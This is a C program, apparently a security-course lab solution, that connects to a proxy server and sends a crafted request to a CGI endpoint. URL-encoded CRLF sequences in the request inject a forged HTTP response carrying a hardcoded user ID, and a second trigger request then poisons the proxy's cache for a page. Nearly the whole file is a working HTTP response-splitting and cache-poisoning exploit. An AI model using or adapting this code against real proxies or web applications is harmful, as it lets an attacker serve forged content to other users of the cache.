#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_IP "192.168.1.202" // Proxy server IP
#define SERVER_PORT 8080         // Proxy server port

// Define a constant for the Host Header
const char *PROXY_HOST = "192.168.1.202:8080";

// Define a constant for the User ID
const char *MY_ID = "207942285";


int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char request[512];
    char trigger_request[256];
    ssize_t bytes_sent;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Manually defined Last-Modified Date
    char last_modified[] = "Wed,%2003%20Jan%202025%2013:02:36%20GMT";

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid server IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Connect to the proxy server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    // Craft the Smuggling Request
    snprintf(request, sizeof(request),
             "GET /cgi-bin/course_selector?course_id=67607%%0D%%0A"
             "Content-Length:%%200%%0D%%0A"
             "Connection:%%20keep-alive%%0D%%0A%%0D%%0A"
             "HTTP/1.1%%20200%%20OK%%0D%%0A"
             "Content-Length:%%2022%%0D%%0A"
             "Content-Type:%%20text/html%%0D%%0A"
             "Last-Modified:%%20%s%%0D%%0A%%0D%%0A"
             "<HTML>%s</HTML> HTTP/1.1\r\n"
             "Connection: keep-alive\r\n"
             "Content-Type: text/html\r\n"
             "Host: %s\r\n\r\n"
             ,last_modified, MY_ID, PROXY_HOST);

    // Send the Smuggling Request
    bytes_sent = send(sockfd, request, strlen(request), 0);
    if (bytes_sent < 0) {
        perror("Failed to send request");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Craft the Trigger Request
    snprintf(trigger_request, sizeof(trigger_request),
       "GET /67607.html HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Connection: keep-alive\r\n\r\n",
       PROXY_HOST);

    // Send the trigger request
    bytes_sent = send(sockfd, trigger_request, strlen(trigger_request), 0);
    if (bytes_sent < 0) {
        perror("Failed to send trigger request");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Close the socket
    close(sockfd);
    return 0;
}